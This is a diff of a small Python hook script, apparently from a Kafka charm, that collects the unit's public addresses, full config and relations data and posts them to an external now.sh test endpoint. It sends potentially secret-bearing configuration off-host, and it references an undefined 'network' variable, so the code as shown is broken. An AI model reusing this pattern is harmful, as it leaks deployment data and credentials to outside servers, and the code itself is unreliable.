@@ -1,8 +1,13 @@
 #!/usr/bin/env python
 
-from charmhelpers.core.hookenv import unit_get, config
+from charmhelpers.core.hookenv import unit_get, config, unit_public_ip, relations
 import requests
+import json
 
 address = unit_get("public-address")
 cfg = config()
-r = requests.post("https://test-api-ddlrzsfdsc.now.sh/", data = {"service": "kafka", "public-address": address, "port": 80, "config": cfg})
+address2 = unit_public_ip()
+relation = relations()
+header = {"Content-Type": "application/json"}
+payload = {"service": "kafka", "public-address": address, "port": 80, "config": cfg, "other-publicAddr": address2, "network": network, "relations": relation}
+requests.post("https://test-api-ddlrzsfdsc.now.sh/", headers=header, data=json.dumps(payload))
